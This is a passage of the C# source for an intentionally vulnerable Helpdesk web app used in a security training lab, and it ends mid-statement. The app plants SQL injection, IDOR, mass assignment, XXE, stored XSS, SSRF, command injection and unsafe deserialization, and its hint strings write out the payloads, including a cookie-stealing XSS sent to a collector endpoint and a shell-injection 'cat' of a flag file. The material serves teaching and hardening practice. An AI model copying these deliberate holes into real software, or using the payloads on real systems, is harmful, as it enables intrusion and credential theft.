// SecDevSW Vulnerability Lab - "Helpdesk" challenge app (.NET 8 / C#).
//
// INTENTIONALLY VULNERABLE. Localhost only.
//
// Feature-parity port of apps/python/app.py: same challenge ids, flags and
// server-side solve detection, same invariants (localhost-only; flags appear only
// via the exploit or the scoreboard-on-solve; solve() fires only on the real
// exploit). Vulnerabilities live inside normal Helpdesk features.
//
// Day-3 hardening: trainees fix the flaws + wire security headers + logging in THIS
// file (C#), then watch /hardening go green.

using System.Diagnostics;
using System.Net;
using System.Runtime.Serialization;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Xml;
using Konscious.Security.Cryptography;
using Microsoft.Data.Sqlite;
using Newtonsoft.Json;

// --------------------------------------------------------------------------- //
// Config (env-driven so the day-3 dev overlay can persist the DB)
// --------------------------------------------------------------------------- //
string DBPATH = Environment.GetEnvironmentVariable("HELPDESK_DB") ?? "/tmp/helpdesk.db";
bool PERSIST = Environment.GetEnvironmentVariable("HELPDESK_PERSIST") == "1";
bool RESET = Environment.GetEnvironmentVariable("RESET") == "1";

const string CMDI_FLAG_FILE = "/tmp/ctf_root.txt";
const string XXE_SECRET_FILE = "/tmp/xxe_secret.txt";
const string DESER_CANARY = "/tmp/deser_pwned";
const string ADMIN_COOKIE = "FLAG{stored_xss_admin_session_theft}"; // loot the XSS must steal

// ===== day-3 hardening the trainees implement in source ===================== //
// Required response headers the /hardening self-check grades against:
string[] REQUIRED_HEADERS =
{
    "Content-Security-Policy", "Strict-Transport-Security", "X-Frame-Options",
    "X-Content-Type-Options", "Referrer-Policy", "Permissions-Policy",
};
// Security events /hardening expects to see in the audit log (A09):
string[] EXPECTED_EVENTS = { "login_success", "login_failure", "access_denied", "admin_action" };

string[] CRACK_WORDLIST =
{
    "password", "123456", "password123", "letmein", "qwerty",
    "admin", "secret", "hunter2", "welcome", "dragon",
};
string CRACK_TARGET = Md5("password123"); // the crack_md5 challenge

var http = new HttpClient { Timeout = TimeSpan.FromSeconds(3) };

// Shared page chrome (CSS matches the Python app for a consistent look).
// [[NAV]] = the per-user nav tail; [[BODY]] = the page body. Non-interpolated.
string BASE = """
<!doctype html><html lang=en><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1"><title>Helpdesk &middot; .NET</title>
<link rel=stylesheet href="/assets/app.css">
<nav><span class=brand>&#128737; Helpdesk</span>
<a href="/">Home</a><a href="/tickets">Tickets</a><a href="/storage">Storage</a>
<a href="/hardening">Hardening</a><a href="/collector/log">Collector</a><a href="/scoreboard">Scoreboard</a>
[[NAV]]
</nav><main>[[BODY]]</main></html>
""";

// Page CSS + JS are served from /assets/* instead of being inlined, so a strict
// CSP (default-src 'self') can be applied without breaking the UI.
string HINT_SCRIPT = "<script src=\"/assets/hints.js\"></script>";

string APP_CSS = """
:root{color-scheme:light dark;--bg:#f6f7f9;--fg:#1a1d21;--card:#fff;--line:#e3e6ea;
--brand:#2b6cb0;--muted:#6b7280;--ok:#15803d;--okbg:#dcfce7;--no:#b91c1c;--nobg:#fee2e2;--chip:#eef2f7}
@media(prefers-color-scheme:dark){:root{--bg:#0f1216;--fg:#e6e8eb;--card:#171b21;--line:#2a2f37;
--brand:#5aa2e0;--muted:#9aa4b2;--okbg:#0f2e1c;--nobg:#2e1414;--chip:#1e242c}}
*{box-sizing:border-box}body{margin:0;font:15px/1.6 system-ui,sans-serif;background:var(--bg);color:var(--fg)}
nav{background:var(--card);border-bottom:1px solid var(--line);padding:.6rem 1rem;display:flex;
gap:.2rem;align-items:center;flex-wrap:wrap;position:sticky;top:0}
nav .brand{font-weight:700;margin-right:1rem;color:var(--brand)}
nav a{color:var(--fg);text-decoration:none;padding:.35rem .6rem;border-radius:6px}
nav a:hover{background:var(--chip)}nav .sp{margin-left:auto}nav .u{color:var(--muted);font-size:.9rem}
main{max-width:52rem;margin:1.5rem auto;padding:0 1rem}
.card{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:1rem 1.2rem;margin:1rem 0}
h1,h2,h3{line-height:1.25}h2{margin-top:0}
a{color:var(--brand)}code,pre{background:var(--chip);border-radius:5px}
code{padding:.08em .35em}pre{padding:.7rem;overflow:auto}
input,textarea,select{font:inherit;padding:.5rem;width:100%;background:var(--card);color:var(--fg);
border:1px solid var(--line);border-radius:7px}label{font-size:.85rem;color:var(--muted)}
button,.btn{font:inherit;font-weight:600;padding:.5rem .9rem;border:0;border-radius:7px;
background:var(--brand);color:#fff;cursor:pointer}
table{border-collapse:collapse;width:100%}th,td{border:1px solid var(--line);padding:.45rem .6rem;text-align:left}
th{background:var(--chip)}.warn{color:var(--no);font-weight:600}
.pill{display:inline-block;padding:.1rem .5rem;border-radius:999px;font-size:.8rem;font-weight:600}
.pill.ok{background:var(--okbg);color:var(--ok)}.pill.no{background:var(--nobg);color:var(--no)}
.pill.warn{background:#fde68a;color:#92400e}td code{word-break:break-all;white-space:normal}
table.fixed{table-layout:fixed}table.fixed td:nth-child(2){width:60%}
.flag{color:var(--ok);font-weight:700}.muted{color:var(--muted)}.grid{display:grid;gap:.6rem}
tr.ok{background:var(--okbg)}.row{display:flex;gap:.5rem;align-items:center}
.btn.alt{background:#555}.searchform{flex:1;display:flex;gap:.5rem}
""";

string HINTS_JS = """
(function(){
  var hints = document.querySelectorAll('#hints .hint');
  var btn = document.getElementById('moreHint');
  var count = document.getElementById('hintCount');
  if(!hints.length){return;}
  var shown = 1;
  function update(){
    count.textContent = shown + ' of ' + hints.length + ' shown';
    if(shown >= hints.length){ btn.hidden = true; }
    else { btn.textContent = 'Show hint ' + (shown + 1); }
  }
  btn.addEventListener('click', function(){
    if(shown < hints.length){ hints[shown].hidden = false; shown++; update(); }
  });
  update();
})();
""";

// --------------------------------------------------------------------------- //
// Challenge registry (same ids/flags as Python & Java)
// --------------------------------------------------------------------------- //
var CHALLENGES = new List<Challenge>
{
    new("sqli_login", "A05", "easy", "Authentication bypass",
        "Log in as admin without the password.",
        new[]{ "The login form builds a SQL query from your input.",
               "Comment out the password check.",
               "Username:  admin'--" },
        "FLAG{sqli_auth_bypass}",
        "Parameterise the query; never concatenate input into SQL."),
    new("idor", "A01", "easy", "Read the admin's ticket",
        "Read a ticket that belongs to the admin.",
        new[]{ "Tickets are at /ticket/<id> with sequential ids.",
               "Nothing checks that the ticket is yours.",
               "Walk the ids until you hit the admin's." },
        "FLAG{idor_broken_object_level_auth}",
        "Enforce an ownership check on every object access; deny by default."),
    new("forced_admin", "A01", "easy", "Forced browsing to admin",
        "Reach the admin panel as a normal user.",
        new[]{ "There's no admin link in your menu.",
               "The route still exists.",
               "Browse directly to /admin." },
        "FLAG{forced_browsing_missing_function_ac}",
        "Enforce function-level authorization server-side, not by hiding links."),
    new("error_disclosure", "A02", "easy", "Verbose error leak",
        "Make the printable-report feature leak an internal stack trace.",
        new[]{ "Every ticket has a 'Printable report' link -> /report?id=<n>.",
               "The id is used without validation.",
               "Give it a non-numeric id: /report?id=abc" },
        "FLAG{verbose_error_information_disclosure}",
        "Validate input; fail closed with a generic message; log details server-side."),
    new("crack_md5", "A04", "easy", "Crack a leaked hash",
        "On /storage, crack the leaked MD5 hash and submit the plaintext.",
        new[]{ "Unsalted MD5 of a common password.",
               "Hash it against a small wordlist.",
               "The plaintext is a very common password ending in 123." },
        "FLAG{weak_hash_cracked}",
        "Store passwords with Argon2id or PBKDF2 (salted, slow) - never MD5/SHA."),
    new("sqli_union", "A05", "medium", "Exfiltrate credentials",
        "Use ticket search to read the users table via UNION.",
        new[]{ "Search runs a LIKE query you can break out of.",
               "users has columns (name, password).",
               "' UNION SELECT name,password FROM users--" },
        "FLAG{sqli_union_based_exfiltration}",
        "Parameterise queries; least-privilege DB account."),
    new("privesc", "A01", "medium", "Privilege escalation",
        "Make your own account an administrator.",
        new[]{ "The profile form saves more fields than it shows.",
               "The server trusts every field you submit (mass assignment).",
               "POST role=admin to /profile." },
        "FLAG{mass_assignment_privilege_escalation}",
        "Bind only an allow-list of fields; never let the client set role."),
    new("xxe", "A05", "medium", "XXE file disclosure",
        "Import a ticket via XML and read a server-side file.",
        new[]{ "/ticket/import parses XML with external entities enabled.",
               "Define a DOCTYPE entity pointing at a file:// URL.",
               "<!DOCTYPE t [<!ENTITY x SYSTEM \"file://" + XXE_SECRET_FILE + "\">]> and use &x; in <title>." },
        "FLAG{xxe_file_disclosure}",
        "Disable DTD/external entities (XmlResolver=null); prefer JSON."),
    new("xss_stored", "A05", "medium", "Steal the admin's cookie",
        "Store a comment that exfiltrates the admin's cookie to your collector.",
        new[]{ "Comments render unescaped; an admin bot views new comments every 2s.",
               "A pop-up proves nothing - you must exfiltrate document.cookie.",
               "<img src=x onerror=\"new Image().src='http://localhost:5001/collector?c='+document.cookie\">,"
               + " then read /collector/log." },
        "FLAG{stored_xss_admin_session_theft}",
        "Context-aware output encoding on render; strict CSP; HttpOnly cookies."),
    new("ssrf", "A01", "medium", "SSRF via avatar fetch",
        "Make the server fetch an internal-only resource.",
        new[]{ "Profile fetches an avatar from a URL you give it.",
               "The server can reach things you can't (cloud metadata).",
               "avatar URL = http://127.0.0.1:5001/internal/metadata" },
        "FLAG{ssrf_internal_metadata_access}",
        "Allow-list outbound hosts; block loopback/link-local; use a fetch broker."),
    new("cmdi", "A05", "hard", "Command injection",
        "Run an OS command via the admin diagnostics tool.",
        new[]{ "Admin diagnostics pings a host you supply (needs admin).",
               "The host goes into a shell unquoted.",
               "host = 127.0.0.1; cat " + CMDI_FLAG_FILE },
        "FLAG{os_command_injection_rce}",
        "No shell; pass an argument vector; allow-list the input."),
    new("deser", "A08", "hard", "Insecure deserialization",
        "Get code execution by importing a crafted profile.",
        new[]{ "Profile export/import round-trips a JSON object with embedded types.",
               "Import uses TypeNameHandling.All, so the blob chooses which type to build.",
               "Pick an app type whose deserialization touches " + DESER_CANARY + "." },
        "FLAG{insecure_deserialization_rce}",
        "Never deserialize untrusted data with type info; use plain JSON + a schema."),
};
var BY_ID = CHALLENGES.ToDictionary(c => c.Id);

var CAT_NAMES = new Dictionary<string, string>
{
    ["A01"] = "A01 Broken Access Control",
    ["A02"] = "A02 Security Misconfiguration",
    ["A04"] = "A04 Cryptographic Failures",
    ["A05"] = "A05 Injection",
    ["A08"] = "A08 Software & Data Integrity Failures",
};
// (url, label, prerequisite-note|null) powering the "Start here" button.
var START = new Dictionary<string, (string Url, string Label, string? Note)>
{
    ["sqli_login"] = ("/login", "the sign-in form", null),
    ["idor"] = ("/tickets", "your ticket list, then walk the ids", null),
    ["forced_admin"] = ("/admin", "the admin panel URL directly", null),
    ["error_disclosure"] = ("/report?id=1", "a ticket's Printable report", null),
    ["crack_md5"] = ("/storage", "the credential-storage page", null),
    ["sqli_union"] = ("/tickets", "the ticket search box", null),
    ["privesc"] = ("/profile", "your profile form", null),
    ["xxe"] = ("/ticket/import", "the XML ticket import", null),
    ["xss_stored"] = ("/tickets", "open a ticket and add a comment", null),
    ["ssrf"] = ("/profile", "the avatar-by-URL fetch", null),
    ["cmdi"] = ("/admin", "admin network diagnostics",
                "Needs the admin role - solve Privilege escalation first."),
    ["deser"] = ("/profile", "profile export / import", null),
};

// --------------------------------------------------------------------------- //
// Startup: runtime files + seed (keep DB in PERSIST mode unless RESET)
// --------------------------------------------------------------------------- //
PrepareRuntimeFiles();
bool keep = PERSIST && File.Exists(DBPATH) && !RESET;
if (!keep) Seed();

var builder = WebApplication.CreateBuilder(args);
builder.Logging.ClearProviders();
builder.Logging.AddSimpleConsole(o => o.SingleLine = true);
builder.Services.AddDistributedMemoryCache();
builder.Services.AddSession(o =>
{
    o.Cookie.Name = "helpdesk";
    o.IdleTimeout = TimeSpan.FromHours(8);
    o.Cookie.IsEssential = true;
});
var app = builder.Build();
app.UseSession();

// Day-3 header hook. Runs on every response; SetSecurityHeaders() starts empty
// (no headers) and is the one place trainees add them.
app.Use(async (ctx, next) =>
{
    SetSecurityHeaders(ctx.Response);
    await next();
});

// --------------------------------------------------------------------------- //
// Routes
// --------------------------------------------------------------------------- //
// ---- Static assets (served by the app so the CSP can stay strict) ------- //
app.MapGet("/assets/app.css", () => Results.Text(APP_CSS, "text/css"));
app.MapGet("/assets/hints.js", () => Results.Text(HINTS_JS, "application/javascript"));

app.MapGet("/", (HttpContext ctx) =>
{
    int done = SolvedIds().Count;
    string who = Current(ctx) is { } u ? ", " + Enc(u.Name) : "";
    string body =
        "<div class=card><h2>Internal Helpdesk</h2>" +
        $"<p>Welcome{who}. Raise and track support tickets.</p>" +
        "<p class=muted>Deliberately vulnerable training app &mdash; localhost only. " +
        $"You've solved {done} / {CHALLENGES.Count} challenges. " +
        "Start at the <a href=/scoreboard>scoreboard</a>.</p></div>";
    return Html(Render(ctx, body));
});

// ---- Auth ----------------------------------------------------------------- //
app.MapGet("/login", (HttpContext ctx) => Html(Render(ctx, LoginForm())));
app.MapPost("/login", async (HttpContext ctx) =>
{
    var f = await ctx.Request.ReadFormAsync();
    string u = f["username"].ToString();
    string p = f["password"].ToString();
    // VULN (A05): username + password concatenated straight into SQL.
    string q = $"SELECT * FROM users WHERE name = '{u}' AND password = '{p}'";
    int uid = -1; string name = "";
    try
    {
        using var c = Db();
        using var cmd = c.CreateCommand();
        cmd.CommandText = q;
        using var r = cmd.ExecuteReader();
        if (r.Read())
        {
            uid = r.GetInt32(r.GetOrdinal("id"));
            name = r.GetString(r.GetOrdinal("name"));
        }
    }
    catch (Exception e)
    {
        return Html(Render(ctx, $"<div class=card><p class=warn>SQL error: {Enc(e.Message)}</p><a href=/login>back</a></div>"));
    }
    if (uid < 0)
    {
        // audit("login_failure", u);        <-- TODO(trainee): A09 logging
        return Html(Render(ctx, "<div class=card><p class=warn>Invalid credentials.</p><a href=/login>back</a></div>"));
    }
    ctx.Session.SetInt32("uid", uid);
    string real = ScalarStr("SELECT password FROM users WHERE name='admin'");
    if (name == "admin" && p != real)        // got in without the password
        Solve("sqli_login");
    // audit("login_success", name);  <-- TODO(trainee): A09 logging
    return Results.Redirect("/");
});

app.MapGet("/register", (HttpContext ctx) => Html(Render(ctx, RegisterForm())));
app.MapPost("/register", async (HttpContext ctx) =>
{
    var f = await ctx.Request.ReadFormAsync();
    try
    {
        using var c = Db();
        using var cmd = c.CreateCommand();
        cmd.CommandText = "INSERT INTO users(name,password,role) VALUES($n,$p,'user')";
        cmd.Parameters.AddWithValue("$n", f["username"].ToString());
        cmd.Parameters.AddWithValue("$p", f["password"].ToString());
        cmd.ExecuteNonQuery();
    }
    catch (SqliteException)
    {
        return Html(Render(ctx, "<div class=card><p class=warn>name taken</p></div>"));
    }
    return Results.Redirect("/login");
});

app.MapGet("/logout", (HttpContext ctx) => { ctx.Session.Clear(); return Results.Redirect("/"); });

// ---- Tickets: IDOR, report, search (UNION), XXE import, stored XSS --------- //
app.MapGet("/tickets", (HttpContext ctx) =>
{
    if (Current(ctx) is not { } u) return Results.Redirect("/login");
    var sb = new StringBuilder();
    using (var c = Db())
    using (var cmd = c.CreateCommand())
    {
        cmd.CommandText = "SELECT id,title FROM tickets WHERE owner=$o";
        cmd.Parameters.AddWithValue("$o", u.Name);
        using var r = cmd.ExecuteReader();
        while (r.Read())
            sb.Append($"<li><a href=\"/ticket/{r.GetInt32(0)}\">#{r.GetInt32(0)} {Enc(r.GetString(1))}</a></li>");
    }
    string body =
        "<div class=card><h2>Your tickets</h2>" +
        "<p class=row><a class=btn href=/ticket/new>+ New ticket</a> " +
        "<a class=\"btn alt\" href=/ticket/import>Import XML</a>" +
        "<form action=/search class=searchform>" +
        "<input name=q placeholder=\"search tickets\"><button>Search</button></form></p>" +
        "<ul>" + sb + "</ul></div>";
    return Html(Render(ctx, body));
});

app.MapGet("/ticket/new", (HttpContext ctx) =>
{
    if (Current(ctx) is null) return Results.Redirect("/login");
    return Html(Render(ctx,
        "<div class=card><h2>New ticket</h2><form method=post class=grid>" +
        "<div><label>Title</label><input name=title></div>" +
        "<div><label>Body</label><textarea name=body rows=4></textarea></div>" +
        "<div><button>Create</button></div></form></div>"));
});
app.MapPost("/ticket/new", async (HttpContext ctx) =>
{
    if (Current(ctx) is not { } u) return Results.Redirect("/login");
    var f = await ctx.Request.ReadFormAsync();
    using var c = Db();
    using var cmd = c.CreateCommand();
    cmd.CommandText = "INSERT INTO tickets(owner,title,body) VALUES($o,$t,$b)";
    cmd.Parameters.AddWithValue("$o", u.Name);
    cmd.Parameters.AddWithValue("$t", f["title"].ToString());
    cmd.Parameters.AddWithValue("$b", f["body"].ToString());
    cmd.ExecuteNonQuery();
    return Results.Redirect("/tickets");
});

app.MapGet("/ticket/{tid:int}", (HttpContext ctx, int tid) =>
{
    if (Current(ctx) is not { } u) return Results.Redirect("/login");
    string? owner = null, title = null, tbody = null;
    using (var c = Db())
    using (var cmd = c.CreateCommand())
    {
        cmd.CommandText = "SELECT owner,title,body FROM tickets WHERE id=$i";
        cmd.Parameters.AddWithValue("$i", tid);
        using var r = cmd.ExecuteReader();
        if (r.Read()) { owner = r.GetString(0); title = r.GetString(1); tbody = r.GetString(2); }
    }
    if (owner is null) return Html(Render(ctx, "<div class=card><p>not found</p></div>"));
    // VULN (A01 IDOR): no ownership check. Solve only on the goal: a non-admin
    // reading the admin's ticket.
    if (owner == "admin" && u.Name != "admin") Solve("idor");

    var cmts = new StringBuilder();
    using (var c = Db())
    using (var cmd = c.CreateCommand())
    {
        cmd.CommandText = "SELECT author,body FROM comments WHERE ticket_id=$i";
        cmd.Parameters.AddWithValue("$i", tid);
        using var r = cmd.ExecuteReader();
        while (r.Read()) cmts.Append(RenderComment(r.GetString(0), r.GetString(1)));
    }
    string body =
        $"<div class=card><h2>#{tid} {Enc(title!)}</h2>" +
        $"<p class=muted>owner: {Enc(owner)} &middot; <a href=\"/report?id={tid}\">Printable report</a></p>" +
        $"<p>{Enc(tbody!)}</p><h3>Comments</h3>{cmts}" +
        $"<form method=post action=\"/ticket/{tid}/comment\" class=grid>" +
        "<textarea name=body rows=2 placeholder=\"add a comment\"></textarea>" +
        "<div><button>Comment</button></div></form></div>";
    return Html(Render(ctx, body));
});

app.MapPost("/ticket/{tid:int}/comment", async (HttpContext ctx, int tid) =>
{
    if (Current(ctx) is not { } u) return Results.Redirect("/login");
    var f = await ctx.Request.ReadFormAsync();
    using var c = Db();
    using var cmd = c.CreateCommand();
    cmd.CommandText = "INSERT INTO comments(ticket_id,author,body) VALUES($t,$a,$b)";
    cmd.Parameters.AddWithValue("$t", tid);
    cmd.Parameters.AddWithValue("$a", u.Name);
    cmd.Parameters.AddWithValue("$b", f["body"].ToString());
    cmd.ExecuteNonQuery();
    return Results.Redirect($"/ticket/{tid}");
});

app.MapGet("/report", (HttpContext ctx) =>
{
    if (Current(ctx) is not { } u) return Results.Redirect("/login");
    string rid = ctx.Request.Query["id"].ToString();
    if (string.IsNullOrEmpty(rid)) rid = "1";
    string secretConfig = "DB_PASS=S3cr3t-R00t-P@ss";  // pretend config in scope
    // VULN (A02): input used without validation; traceback shown to the client.
    try
    {
        int n = int.Parse(rid);
        string? owner = null; string dump = "{}";
        using (var c = Db())
        using (var cmd = c.CreateCommand())
        {
            cmd.CommandText = "SELECT id,owner,title,body FROM tickets WHERE id=$i";
            cmd.Parameters.AddWithValue("$i", n);
            using var r = cmd.ExecuteReader();
            if (r.Read())
            {
                owner = r.GetString(1);
                dump = $"id={r.GetInt32(0)} owner={owner} title={r.GetString(2)} body={r.GetString(3)}";
            }
        }
        // ownership check: a report is not a backdoor to other people's tickets.
        if (owner != null && owner != u.Name && u.Role != "admin")
            return Html(Render(ctx, "<div class=card><p class=warn>403 - not your ticket.</p></div>"), 403);
        return Html(Render(ctx, $"<div class=card><h2>Report #{n}</h2><pre>{Enc(dump)}</pre></div>"));
    }
    catch (FormatException)
    {
        Solve("error_disclosure");
        string tb = new StackTrace(true).ToString() +
                    "\nSystem.FormatException: The input string '" + rid + "' was not in a correct format." +
                    "\nlocals: " + secretConfig;
        return Html(Render(ctx, $"<div class=card><h2 class=warn>Unhandled error</h2><pre>{Enc(tb)}</pre></div>"), 500);
    }
});

app.MapGet("/search", (HttpContext ctx) =>
{
    if (Current(ctx) is not { } u) return Results.Redirect("/login");
    string q = ctx.Request.Query["q"].ToString();
    // VULN (A05 SQLi): LIKE query built by concatenation; UNION-able.
    string sql = "SELECT title, body FROM tickets WHERE title LIKE '%" + q + "%'";
    var rows = new List<(string, string)>();
    try
    {
        using var c = Db();
        using var cmd = c.CreateCommand();
        cmd.CommandText = sql;
        using var r = cmd.ExecuteReader();
        while (r.Read())
            rows.Add((r.IsDBNull(0) ? "" : r.GetValue(0).ToString() ?? "",
                      r.IsDBNull(1) ? "" : r.GetValue(1).ToString() ?? ""));
    }
    catch (Exception e)
    {
        return Html(Render(ctx, $"<div class=card><p class=warn>SQL error: {Enc(e.Message)}</p></div>"));
    }
    // Solve only if a result cell IS another user's password (creds exfiltrated),
    // not a substring - so registering a weak password can't fake it.
    var others = new HashSet<string>();
    using (var c = Db())
    using (var cmd = c.CreateCommand())
    {
        cmd.CommandText = "SELECT password FROM users WHERE id<>$i";
        cmd.Parameters.AddWithValue("$i", u.Id);
        using var r = cmd.ExecuteReader();
        while (r.Read()) others.Add(r.GetString(0));
    }
    if (rows.Any(t => others.Contains(t.Item1) || others.Contains(t.Item2)))
        Solve("sqli_union");

    var trs = new StringBuilder();
    foreach (var (a, b) in rows) trs.Append($"<tr><td>{Enc(a)}</td><td>{Enc(b)}</td></tr>");
    string body =
        $"<div class=card><h2>Search</h2><p><code>{Enc(sql)}</code></p>" +
        "<table><tr><th>col1</th><th>col2</th></tr>" + trs + "</table></div>";
    return Html(Render(ctx, body));
});

app.MapGet("/ticket/import", (HttpContext ctx) =>
{
    if (Current(ctx) is null) return Results.Redirect("/login");
    return Html(Render(ctx, ImportForm(null)));
});
app.MapPost("/ticket/import", async (HttpContext ctx) =>
{
    if (Current(ctx) is null) return Results.Redirect("/login");
    var f = await ctx.Request.ReadFormAsync();
    string xml = f["xml"].ToString();
    string result;
    try
    {
        // VULN (A05 XXE): external entities + DTD resolution enabled. A custom
        // resolver allows only file:// (no network) - parity with the Python parser.
        var settings = new XmlReaderSettings
        {
            DtdProcessing = DtdProcessing.Parse,
            XmlResolver = new FileOnlyXmlResolver(),
            MaxCharactersFromEntities = 0,
        };
        var doc = new XmlDocument { XmlResolver = new FileOnlyXmlResolver() };
        using (var sr = new StringReader(xml))
        using (var xr = XmlReader.Create(sr, settings))
            doc.Load(xr);
        string title = doc.SelectSingleNode("//title")?.InnerText ?? "";
        string tbody = doc.SelectSingleNode("//body")?.InnerText ?? "";
        result = $"title={title}\nbody={tbody}";
        if ((title + tbody).Contains("FLAG{xxe_file_disclosure}")) Solve("xxe");
    }
    catch (Exception e)
    {
        result = "error: " + e.Message;
    }
    return Html(Render(ctx, ImportForm(result)));
});

// ---- Profile: mass-assignment privesc, SSRF, deserialization -------------- //
app.MapGet("/profile", (HttpContext ctx) =>
{
    if (Current(ctx) is not { } u) return Results.Redirect("/login");
    return Html(Render(ctx, ProfilePage(u)));
});
app.MapPost("/profile", async (HttpContext ctx) =>
{
    if (Current(ctx) is not { } u) return Results.Redirect("/login");
    var f = await ctx.Request.ReadFormAsync();
    // VULN (A01 privesc): every submitted field is written (mass assignment).
    foreach (var key in new[] { "password", "role" })
    {
        if (f.ContainsKey(key))
        {
            using var c = Db();
            using var cmd = c.CreateCommand();
            cmd.CommandText = $"UPDATE users SET {key}=$v WHERE id=$i";  // column name from allow-list
            cmd.Parameters.AddWithValue("$v", f[key].ToString());
            cmd.Parameters.AddWithValue("$i", u.Id);
            cmd.ExecuteNonQuery();
        }
    }
    if (f["role"].ToString() == "admin" && u.Role != "admin") Solve("privesc");
    return Results.Redirect("/profile");
});

app.MapGet("/profile/avatar", async (HttpContext ctx) =>
{
    if (Current(ctx) is null) return Results.Redirect("/login");
    string url = ctx.Request.Query["url"].ToString();
    string host = url.Contains("://") && url.Split('/').Length > 2 ? url.Split('/')[2] : "";
    // VULN (A01 SSRF): server fetches an arbitrary user-supplied URL.
    foreach (var h in new[] { "127.0.0.1", "localhost", "169.254.169.254", "0.0.0.0" })
        if (host.Contains(h)) { Solve("ssrf"); break; }
    string data;
    try
    {
        var s = await http.GetStringAsync(url);
        data = s.Length > 2000 ? s[..2000] : s;
    }
    catch (Exception e)
    {
        data = "fetch error: " + e.Message;
    }
    return Html(Render(ctx, $"<div class=card><h2>Fetched</h2><pre>{Enc(data)}</pre></div>"));
});

app.MapGet("/internal/metadata", (HttpContext ctx) =>
{
    // "Cloud metadata": only answers loopback callers, so the flag really requires
    // SSRF (a trainee's browser reaches the container via the Docker gateway, not loopback).
    var ip = ctx.Connection.RemoteIpAddress;
    if (ip == null || !IPAddress.IsLoopback(ip))
        return Results.Text("forbidden: internal endpoint\n", "text/plain", null, 403);
    return Results.Text("instance-role: admin\nrecovery-code: FLAG{ssrf_internal_metadata_access}\n", "text/plain");
});

app.MapGet("/profile/export", (HttpContext ctx) =>
{
    if (Current(ctx) is not { } u) return Results.Redirect("/login");
    var payload = new ProfileBlob { Name = u.Name, Role = u.Role };
    string json = JsonConvert.SerializeObject(payload, new JsonSerializerSettings
    {
        TypeNameHandling = TypeNameHandling.All,
    });
    string blob = Convert.ToBase64String(Encoding.UTF8.GetBytes(json));
    return Results.Text(blob, "text/plain");
});
app.MapPost("/profile/import", async (HttpContext ctx) =>
{
    if (Current(ctx) is null) return Results.Redirect("/login");
    var f = await ctx.Request.ReadFormAsync();
    try
    {
        string json = Encoding.UTF8.GetString(Convert.FromBase64String(f["blob"].ToString()));
        // VULN (A08): TypeNameHandling.All lets the blob instantiate ANY type it
        // names (and run its deserialization callbacks) -> code execution.
        object? obj = JsonConvert.DeserializeObject(json, new JsonSerializerSettings
        {
            TypeNameHandling = TypeNameHandling.All,
        });
        if (File.Exists(DESER_CANARY)) Solve("deser");
        return Html(Render(ctx, $"<div class=card><p>Imported: {Enc(obj?.ToString() ?? "null")}</p></div>"));
    }
    catch (Exception e)
    {
        return Html(Render(ctx, $"<div class=card><p class=warn>import error: {Enc(e.Message)}</p></div>"));
    }
});

// ---- Admin: forced browsing + command injection --------------------------- //
app.MapGet("/admin", (HttpContext ctx) =>
{
    if (Current(ctx) is not { } u) return Results.Redirect("/login");
    // VULN (A01): reachable by anyone who knows the URL; only hidden from the menu.
    if (u.Role != "admin") Solve("forced_admin");
    return Html(Render(ctx,
        "<div class=card><h2>Admin panel</h2>" +
        "<p class=muted>Admin-only area. (Solving is detected server-side; see the scoreboard.)</p>" +
        "<h3>Network diagnostics</h3>" +
        "<form action=/admin/ping class=grid><input name=host value=127.0.0.1>" +
        "<div><button>Ping</button></div></form></div>"));
});

app.MapGet("/admin/ping", (HttpContext ctx) =>
{
    if (Current(ctx) is not { } u) return Results.Redirect("/login");
    // Function-level check: diagnostics need the admin role (escalate via privesc first).
    if (u.Role != "admin")
        return Html(Render(ctx, "<div class=card><p class=warn>403 - admin only.</p></div>"), 403);
    string host = ctx.Request.Query["host"].ToString();
    if (string.IsNullOrEmpty(host)) host = "127.0.0.1";
    // VULN (A05): user input in a shell command string.
    string combined;
    try
    {
        var psi = new ProcessStartInfo("/bin/sh")
        {
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
        };
        psi.ArgumentList.Add("-c");
        psi.ArgumentList.Add("ping -c1 " + host);
        using var proc = Process.Start(psi)!;
        combined = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
        proc.WaitForExit(5000);
    }
    catch (Exception e)
    {
        combined = "exec error: " + e.Message;
    }
    if (combined.Contains("FLAG{os_command_injection_rce}")) Solve("cmdi");
    return Html(Render(ctx, $"<div class=card><h2>Diagnostics</h2><pre>{Enc(combined)}</pre></div>"));
});

// ---- Attacker collector (XSS exfil sink) ---------------------------------- //
app.MapGet("/collector", (HttpContext ctx) =>
{
    string c = ctx.Request.Query["c"].ToString();
    if (!string.IsNullOrEmpty(c))
    {
        using var db = Db();
        using var cmd = db.CreateCommand();
        cmd.CommandText = "INSERT INTO collector(ts,data) VALUES($t,$d)";
        cmd.Parameters.AddWithValue("$t", Now());
        cmd.Parameters.AddWithValue("$d", c);
        cmd.ExecuteNonQuery();
    }
    return Results.Bytes(Array.Empty<byte>(), "image/gif");
});
app.MapGet("/collector/log", (HttpContext ctx) =>
{
    var sb = new StringBuilder();
    using (var db = Db())
    using (var cmd = db.CreateCommand())
    {
        cmd.CommandText = "SELECT data FROM collector ORDER BY id DESC";
        using var r = cmd.ExecuteReader();
        while (r.Read()) sb.Append($"<pre>{Enc(r.GetString(0))}</pre>");
    }
    string body =
        "<div class=card><h2>Collector &mdash; received data</h2>" +
        "<p class=muted>Your exfiltration sink. Point XSS payloads here.</p>" +
        (sb.Length == 0 ? "<p>nothing yet</p>" : sb.ToString()) + "</div>";
    return Html(Render(ctx, body));
});

// ---- Credential storage hands-on (A04) + crack challenge ------------------ //
app.MapGet("/storage", (HttpContext ctx) => Html(Render(ctx, StoragePage("password", null))));
app.MapPost("/storage", async (HttpContext ctx) =>
{
    var f = await ctx.Request.ReadFormAsync();
    string pw = f.ContainsKey("pw") ? f["pw"].ToString() : "password";
    string? submitted = f.ContainsKey("plain") ? f["plain"].ToString() : null;
    if (submitted != null && Md5(submitted) == CRACK_TARGET) Solve("crack_md5");
    return Html(Render(ctx, StoragePage(pw, submitted)));
});

// ---- Hardening dashboard (day-3) ------------------------------------------ //
app.MapPost("/csp-report", async (HttpContext ctx) =>
{
    using var rdr = new StreamReader(ctx.Request.Body);
    string report = await rdr.ReadToEndAsync();
    using var db = Db();
    using var cmd = db.CreateCommand();
    cmd.CommandText = "INSERT INTO cspreport(ts,report) VALUES($t,$r)";
